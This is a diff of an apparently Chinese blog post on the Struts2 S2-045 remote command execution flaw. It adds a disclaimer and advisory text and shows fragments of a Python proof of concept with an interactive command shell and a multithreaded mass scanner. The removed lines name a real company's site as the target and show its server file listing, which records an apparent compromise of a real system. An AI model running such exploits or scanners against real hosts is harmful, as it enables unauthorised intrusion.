@@ -6,7 +6,19 @@ tags: struts2
 categories: 技术交流
 ---
 <blockquote class="blockquote-center">Struts2是个好东西</blockquote>
+免责申明：*文章中的工具等仅供个人测试研究，请在下载后24小时内删除，不得用于商业或非法用途，否则后果自负*
+
+
+　　Apache Struts 2被曝存在远程命令执行漏洞，漏洞编号S2-045，CVE编号CVE-2017-5638，在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵，漏洞评级为：高危。
 <!--more -->
+漏洞详情：恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞进而执行系统命令。
+风险等级：高风险。
+漏洞风险：黑客通过利用漏洞可以实现远程命令执行。
+影响版本：Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10。
+安全版本：Struts 2.3.32或2.5.10.1。
+修复建议：如您正在使用Jakarta文件上传插件，请升级Struts至安全版本。
+
+更多参考：[https://cwiki.apache.org/confluence/display/WW/S2-045](https://cwiki.apache.org/confluence/display/WW/S2-045)
 
 ### POC
 ```bash
@@ -27,7 +39,6 @@ def poc(url):
 
     return body
 
-url="http://job.10086.cn/company/anouncement/showAnouncement.action"
 url=sys.argv[1]
 body=poc(url)
 if "nMask" in body:
@@ -53,7 +64,6 @@ def poc(url,content="echo nMask"):
 
     return body
 
-url="http://job.10086.cn/company/anouncement/showAnouncement.action"
 url=sys.argv[1]
 body=poc(url)
 if "nMask" in body:
@@ -65,63 +75,13 @@ if "nMask" in body:
 ```
 运行结果：
 ```bash
->python s2_045_cmd.py http://job.10086.cn/company/anouncement/showAnouncement.action
+>python s2_045_cmd.py http://xxx.com/?a.action
 
-[Loopholes exist] http://job.10086.cn/company/anouncement/showAnouncement.action
+[Loopholes exist] http://xxx.com/?a.action
 
 [cmd]>>ls
-autodeploy
-bin
-career2.log
-career2.log.2017-02-01
-career2.log.2017-02-02
-career2.log.2017-02-03
-career2.log.2017-02-04
-career2.log.2017-02-05
-career2.log.2017-02-06
-career2.log.2017-02-07
-career2.log.2017-02-08
-career2.log.2017-02-09
-career2.log.2017-02-10
-career2.log.2017-02-11
-career2.log.2017-02-12
-career2.log.2017-02-13
-career2.log.2017-02-14
-career2.log.2017-02-15
-career2.log.2017-02-16
-career2.log.2017-02-17
-career2.log.2017-02-18
-career2.log.2017-02-19
-career2.log.2017-02-20
-career2.log.2017-02-21
-career2.log.2017-02-22
-career2.log.2017-02-23
-career2.log.2017-02-24
-career2.log.2017-02-25
-career2.log.2017-02-26
-career2.log.2017-02-27
-career2.log.2017-02-28
-career2.log.2017-03-01
-career2.log.2017-03-02
-career2.log.2017-03-03
-career2.log.2017-03-04
-career2.log.2017-03-05
-career2.log.2017-03-06
-config
-config20150826.tar.gz
-config20151204.tar.gz
-console-ext
-edit.lok
-fileRealm.properties
-init-info
-lib
-pending
-security
-servers
-shutdown.py
-startManagedWebLogic_readme.txt
-startWebLogic.sh
-tmp
+example1
+example2
 ```
 
 ### 多线程批量检测
@@ -163,23 +123,6 @@ if __name__=="__main__":
 			if(len(threading.enumerate())<50):
 				break
 ```
-
-Apache Struts 2被曝存在远程命令执行漏洞，漏洞编号S2-045，CVE编号CVE-2017-5638，在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵，漏洞评级为：高危。
-
-漏洞详情：恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令。
-
-风险等级：高风险。
-
-漏洞风险：黑客通过利用漏洞可以实现远程命令执行。
-
-影响版本：Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10。
-
-安全版本：Struts 2.3.32或2.5.10.1。
-
-修复建议：如您正在使用Jakarta文件上传插件，请升级Struts至安全版本。
-
-更多参考：[https://cwiki.apache.org/confluence/display/WW/S2-045](https://cwiki.apache.org/confluence/display/WW/S2-045)
-
 POC下载地址：[https://github.com/tengzhangchao/Struts2_045-Poc](https://github.com/tengzhangchao/Struts2_045-Poc)
 
 更多检测脚本，敬请期待......
